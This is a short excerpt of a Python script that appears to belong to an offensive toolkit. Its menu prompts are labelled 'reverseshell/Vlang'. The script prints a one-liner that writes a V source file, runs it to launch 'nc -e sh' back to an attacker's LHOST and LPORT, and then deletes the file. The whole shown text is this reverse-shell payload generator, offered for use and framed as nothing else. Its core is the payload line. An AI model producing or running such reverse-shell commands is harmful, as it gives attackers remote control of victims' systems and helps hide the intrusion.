...
while True:  
    try:
        exin = input("\033[1;32msmf\033[1;34m(\033[1;31mreverseshell/Vlang\033[1;34m) > \033[1;32m")
...
while True:
                    exin2 = input("\033[1;31m(\033[1;34mreverseshell/Vlang\033[1;31m)> \033[1;32m")
...
time.sleep(1)
print(f"""
\033[1;32mecho 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e sh {LHOST} {LPORT} 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v
""")
time.sleep(3)
